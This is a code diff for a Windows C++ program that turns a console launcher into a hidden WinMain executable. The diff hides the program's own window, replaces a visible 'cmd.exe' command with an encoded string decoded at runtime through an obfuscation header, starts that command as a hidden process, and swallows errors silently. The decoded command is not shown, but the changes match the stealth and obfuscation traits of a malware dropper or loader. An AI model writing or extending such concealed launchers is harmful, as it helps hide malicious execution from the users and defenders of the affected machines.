@@ -7,28 +7,47 @@
 
 #include <windows.h>
 
+#include "xstr.hpp"
+
 using namespace std;
 
-int main (int argc, char** argv) {
+HWND getHWND (DWORD proc) {
+    HWND hwnd = 0;
+    do {
+        hwnd = FindWindowEx(NULL, hwnd, NULL, NULL);
+        DWORD pid = 0;
+        GetWindowThreadProcessId (hwnd, &pid);
+        if (pid == proc) return hwnd;
+    }
+    while (hwnd != NULL);
+    return NULL;
+}
+
+int
+WinMain (   HINSTANCE hInstance,
+            HINSTANCE hPrevInstance,
+            LPTSTR    lpCmdLine,
+            int       nCmdShow 
+) {
 try {
     STARTUPINFO si;
     PROCESS_INFORMATION pi;
 
-    string args("cmd.exe /c cmd.exe");
+    ShowWindow( getHWND( GetCurrentProcessId()), SW_HIDE);
+
+    hide::line args("lpEK8Q3dBrTONPRSQV8NmrnEJMgomg2oxNWh");
+    args.decode();
 
     ZeroMemory( &si, sizeof(si) );
     si.cb = sizeof(si);
-    si.dwFlags = STARTF_USESHOWWINDOW;
-    si.wShowWindow = SW_HIDE;
-
     ZeroMemory( &pi, sizeof(pi) );
 
     if( !CreateProcess ( NULL,   // No module name (use command line)
-        (LPSTR)args.c_str(),        // Command line
+        (LPSTR)args.c_str(),  // Command line
         NULL,           // Process handle not inheritable
         NULL,           // Thread handle not inheritable
         FALSE,          // Set handle inheritance to FALSE
-        CREATE_NO_WINDOW,              // Hidden
+        CREATE_NO_WINDOW,  // Hidden
         NULL,           // Use parent's environment block
         NULL,           // Use parent's starting directory 
         &si,            // Pointer to STARTUPINFO structure
@@ -43,8 +62,7 @@ try {
 
     return 0;
 } catch (const exception& e) {
-    cerr << e.what() << endl;
-    return -1;
+    return 0;
 }}
 
 #endif
